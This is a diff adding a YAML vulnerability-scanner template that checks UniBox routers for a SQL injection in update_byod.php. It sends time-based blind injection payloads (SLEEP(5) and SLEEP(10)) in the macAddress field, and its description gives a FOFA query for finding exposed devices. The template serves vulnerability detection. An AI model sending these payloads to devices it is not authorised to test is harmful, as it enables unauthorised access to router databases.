@@ -1,0 +1,39 @@
+id: unibox-router-update-byod-sqli
+
+info:
+  name: Unibox路由器update_byod.php-SQL注入漏洞
+  author: avic123
+  severity: high
+  verified: true
+  description: |-
+    UniBox 路由器是一款集成网络控制功能的设备，广泛用于公共 WiFi 热点和企业网络管理。然而，其 update_byod.php 接口存在 SQL 注入漏洞，攻击者可利用该漏洞获取数据库权限，进而访问敏感信息。
+    fofa：body="Unibox" && body="Controller" || body="www.wifi-soft.com"
+  reference:
+    - https://github.com/eeeeeeeeee-code/POC/blob/main/wpoc/unibox%E8%B7%AF%E7%94%B1%E5%99%A8/unibox%E8%B7%AF%E7%94%B1%E5%99%A8postprosa%E6%8E%A5%E5%8F%A3%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5.md
+  tags: unibox,router,sqli
+  created: 2025/08/26
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /authentication/update_byod.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        update=1&macAddress=1'AND (SELECT 2222 FROM (SELECT(SLEEP(5)))ogZo) AND 'NXsn'='NXsn&oldMacAddress=
+    expression: |
+      response.status == 200 && response.latency <= 7000 &&  response.latency >= 5000
+
+  r1:
+    request:
+      method: POST
+      path: /authentication/update_byod.php
+      headers:
+        Content-Type: application/x-www-form-urlencoded
+      body: |
+        update=1&macAddress=1'AND (SELECT 2222 FROM (SELECT(SLEEP(10)))ogZo) AND 'NXsn'='NXsn&oldMacAddress=
+    expression: |
+      response.status == 200 && response.latency <= 12000 &&  response.latency >= 10000
+
+expression: r0() && r1()
